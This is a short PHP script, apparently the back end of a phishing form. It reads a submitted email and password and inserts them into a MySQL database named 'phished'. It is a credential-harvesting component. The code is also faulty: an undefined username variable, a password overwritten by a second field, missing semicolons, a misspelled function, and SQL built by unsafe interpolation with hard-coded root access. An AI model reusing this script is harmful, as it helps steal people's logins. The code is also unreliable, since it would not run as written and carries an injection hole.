<?php

$email=filter_input(INPUT_POST, 'email');
$password=filter_input(INPUT_POST, 'password');
$password=filter_input(INPUT_POST, 'password2');
if (!empty($email)){if (!empty($password)){
    $host='localhost';
    $dbusername='root';
    $dbpassword='';
    $dbname='phished';}}

//create connection
$conn= new mysqli ($host, $dbusername, $dbpassword, $dbname);
if (mysqli_connect_error()){
    die('Connect Error ('.mysqli_connect_errorno().')'.mysqli_connect_error());
    }
else{
    $sql="INSERT INTO account (username, password)
    values ('$username','$password') "
    if ($conn->query($sql)){
        echo 'New record is inserted successfully'

    }
    else{
        echo "Error: ".$sql ."<br>". $conn->error;
    }
    $conn->close();
    
}